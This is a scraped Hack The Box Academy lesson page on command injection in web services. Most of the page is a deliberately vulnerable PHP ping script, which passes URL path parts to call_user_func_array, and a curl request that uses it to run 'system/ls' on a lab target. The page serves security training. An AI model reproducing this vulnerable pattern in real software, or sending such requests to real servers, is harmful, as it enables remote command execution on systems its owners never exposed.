<!--
 // Platform: Academy
// URL: https://academy.hackthebox.com/module/160/section/1473
// Platform Version: V1
// Module ID: 160
// Module Name: Web Service & API Attacks
// Module Difficulty: Medium
// Section ID: 1473
// Section Title: Command Injection
// Page Title: Hack The Box - Academy
// Page Number: 04
-->

# Command Injection

**Module Name:** Web Service & API Attacks **Page Number:** 04

#### 

#### WEB SERVICE & API ATTACKS

# Command Injection

``` php
<?php
function ping($host_url_ip, $packets) {
        if (!in_array($packets, array(1, 2, 3, 4))) {
                die('Only 1-4 packets!');
        }
        $cmd = "ping -c" . $packets . " " . escapeshellarg($host_url);
        $delimiter = "\n" . str_repeat('-', 50) . "\n";
        echo $delimiter . implode($delimiter, array("Command:", $cmd, "Returned:", shell_exec($cmd)));
}

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
        $prt = explode('/', $_SERVER['PATH_INFO']);
        call_user_func_array($prt[1], array_slice($prt, 2));
}
?>
```

``` shell-session
[!bash!]$ sudo tcpdump -i tun0 icmp
 tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
 listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
 11:10:22.521853 IP 10.129.202.133 > 10.10.14.222: ICMP echo request, id 1, seq 1, length 64
 11:10:22.521885 IP 10.10.14.222 > 10.129.202.133: ICMP echo reply, id 1, seq 1, length 64
 11:10:23.522744 IP 10.129.202.133 > 10.10.14.222: ICMP echo request, id 1, seq 2, length 64
 11:10:23.522781 IP 10.10.14.222 > 10.129.202.133: ICMP echo reply, id 1, seq 2, length 64
 11:10:24.523726 IP 10.129.202.133 > 10.10.14.222: ICMP echo request, id 1, seq 3, length 64
 11:10:24.523758 IP 10.10.14.222 > 10.129.202.133: ICMP echo reply, id 1, seq 3, length 64
```

![https://academy.hackthebox.com/storage/modules/160/1.png](https://academy.hackthebox.com/storage/modules/160/1.png)

``` shell-session
[!bash!]$ curl http://<TARGET IP>:3003/ping-server.php/system/ls
index.php
ping-server.php
```

# 

# 

#### Questions

####